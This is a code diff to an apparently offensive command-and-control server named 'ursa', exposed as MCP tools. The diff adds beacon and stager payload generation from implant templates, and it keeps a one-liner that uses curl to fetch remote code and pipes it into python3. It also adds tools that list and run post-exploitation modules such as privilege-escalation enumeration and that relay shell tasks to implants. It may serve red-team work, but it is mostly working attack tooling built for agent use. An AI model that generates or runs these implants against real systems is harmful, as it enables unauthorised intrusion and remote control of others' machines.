@@ -120,6 +120,8 @@ from major.governance import (  # noqa: E402
     process_bulk_approval_decisions,
     queue_task_with_policy,
 )
+from implants.builder import Builder as _PayloadBuilder  # noqa: E402
+from implants.builder import PayloadConfig, auto_c2_url  # noqa: E402
 
 mcp_server = FastMCP(
     "ursa",
@@ -2092,6 +2094,7 @@ def ursa_generate(
     interval: int = 5,
     jitter: float = 0.1,
     output_format: str = "python",
+    template: str = "http_python",
 ) -> str:
     """
     Generate a beacon payload configured for your C2 server.
@@ -2102,45 +2105,62 @@ def ursa_generate(
         interval: Beacon interval in seconds (default 5)
         jitter: Jitter factor 0.0-1.0 (default 0.1)
         output_format: Output format — "python" for full script,
-                       "oneliner" for a one-line command
+                       "oneliner" for a one-line command,
+                       "stager" for configured stager source
+        template: Template name from implants/templates/ (default: http_python)
     """
-    if not c2_url:
-        import socket as _s
-        try:
-            _sock = _s.socket(_s.AF_INET, _s.SOCK_DGRAM)
-            _sock.connect(("8.8.8.8", 80))
-            local_ip = _sock.getsockname()[0]
-            _sock.close()
-        except Exception:
-            local_ip = "YOUR_IP"
-        c2_url = f"http://{local_ip}:8443"
+    resolved_url = c2_url or auto_c2_url()
+
+    builder = _PayloadBuilder()
 
     if output_format == "oneliner":
-        return (f"python3 -c \"$(curl -s {c2_url}/stage)\" "
-                f"--server {c2_url} --interval {interval} --jitter {jitter}")
+        return (
+            f"python3 -c \"$(curl -s {resolved_url}/stage)\" "
+            f"--server {resolved_url} --interval {interval} --jitter {jitter}"
+        )
 
-    # Read the beacon source
-    beacon_path = PROJECT_ROOT / "implants" / "beacon.py"
-    if not beacon_path.exists():
-        return "Beacon source not found at implants/beacon.py"
+    if output_format == "stager":
+        try:
+            return builder.build_stager(resolved_url)
+        except FileNotFoundError:
+            return "Stager source not found at implants/stager.py"
 
-    lines = [
-        "Ursa Beacon Payload Generated",
-        f"C2:       {c2_url}",
-        f"Interval: {interval}s",
-        f"Jitter:   {jitter}",
+    # "python" — build from template
+    available = builder.list_templates()
+    if not available:
+        return (
+            "No templates found in implants/templates/.\n"
+            "Add a .py template file to get started.\n\n"
+            "Deploy command (using beacon.py directly):\n"
+            f"  python3 implants/beacon.py --server {resolved_url} "
+            f"--interval {interval} --jitter {jitter}"
+        )
+
+    config = PayloadConfig(
+        c2_url=resolved_url,
+        interval=interval,
+        jitter=jitter,
+        template=template,
+    )
+    try:
+        source = builder.build(config)
+    except FileNotFoundError:
+        return (
+            f"Template '{template}' not found.\n"
+            f"Available templates: {available}\n\n"
+            f"Use --template with one of the above names."
+        )
+
+    header = [
+        f"# Ursa payload — template: {template}",
+        f"# C2: {resolved_url}  interval: {interval}s  jitter: {jitter}",
+        "#",
+        "# Deploy:",
+        f"#   python3 payload.py",
+        "#",
         "",
-        "Deploy command:",
-        f"  python3 beacon.py --server {c2_url} --interval {interval} --jitter {jitter}",
-        "",
-        "One-liner (curl + exec):",
-        f"  curl -s {c2_url}/stage | python3 - --server {c2_url}",
-        "",
-        f"Beacon source is at: {beacon_path}",
-        "Copy it to the target and run with the deploy command above.",
     ]
-
-    return "\n".join(lines)
+    return "\n".join(header) + source
 
 
 @mcp_server.tool()
@@ -2187,6 +2207,75 @@ def ursa_stager(c2_url: str | None = None) -> str:
     ]
 
     return "\n".join(lines)
+
+
+@mcp_server.tool()
+def ursa_post_list() -> str:
+    """
+    List all available post-exploitation modules.
+
+    Returns a table showing each module's name, description, supported
+    platforms, and whether it is implemented or still a stub.
+    """
+    from post.loader import PostLoader as _PostLoader
+
+    modules = _PostLoader().list_modules()
+    if not modules:
+        return "No post-exploitation modules found."
+
+    lines = ["POST-EXPLOITATION MODULES", "=" * 60, ""]
+    for m in modules:
+        status = "READY" if m["implemented"] else "stub "
+        platforms = ",".join(m["platform"])
+        lines.append(f"[{status}]  {m['name']:<28}  [{platforms}]")
+        lines.append(f"         {m['description']}")
+        lines.append("")
+
+    lines += [
+        "=" * 60,
+        f"Total: {len(modules)}  "
+        f"({sum(1 for m in modules if m['implemented'])} implemented, "
+        f"{sum(1 for m in modules if not m['implemented'])} stubs)",
+        "",
+        "Run a module:  ursa_post_run(module='enum/privesc')",
+    ]
+    return "\n".join(lines)
+
+
+@mcp_server.tool()
+def ursa_post_run(module: str, args: dict | None = None) -> str:
+    """
+    Run a post-exploitation module locally (on the C2 machine).
+
+    Implemented modules perform read-only enumeration of the local system.
+    Stub modules return an error with implementation instructions.
+
+    Modules that run locally are most useful when the C2 is deployed on the
+    target network.  To run against a remote implant session, send the
+    module's shell commands as a 'shell' task via ursa_shell().
+
+    Args:
+        module: Module name, e.g. 'enum/privesc', 'enum/sysinfo'.
+                Use ursa_post_list() to see all available modules.
+        args:   Optional dict of module-specific arguments.
+    """
+    import json
+
+    from post.loader import PostLoader as _PostLoader
+
+    result = _PostLoader().dispatch(module, args or {})
+
+    if not result["ok"]:
+        return f"[ERROR] {result['error']}"
+
+    output_parts = [f"[{module}]  ok=True", ""]
+    if result["output"]:
+        output_parts.append(result["output"])
+    if result["data"]:
+        output_parts += ["", "--- structured data ---",
+                         json.dumps(result["data"], indent=2, default=str)]
+
+    return "\n".join(output_parts)
 
 
 if __name__ == "__main__":
